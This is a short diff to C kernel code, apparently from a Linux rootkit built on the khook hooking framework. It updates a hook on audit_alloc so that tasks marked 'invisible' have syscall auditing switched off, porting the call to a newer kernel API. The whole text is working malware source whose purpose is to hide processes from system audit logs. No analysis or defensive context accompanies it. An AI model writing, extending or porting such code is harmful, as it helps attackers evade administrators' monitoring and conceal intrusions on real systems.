@@ -44,7 +44,7 @@ static int khook_audit_alloc(struct task_struct *t)
 	int err = 0;
 
 	if (is_task_invisible(t)) {
-		clear_tsk_thread_flag(t, TIF_SYSCALL_AUDIT);
+		clear_task_syscall_work(t, SYSCALL_AUDIT);
 	} else {
 		err = KHOOK_ORIGIN(audit_alloc, t);
 	}
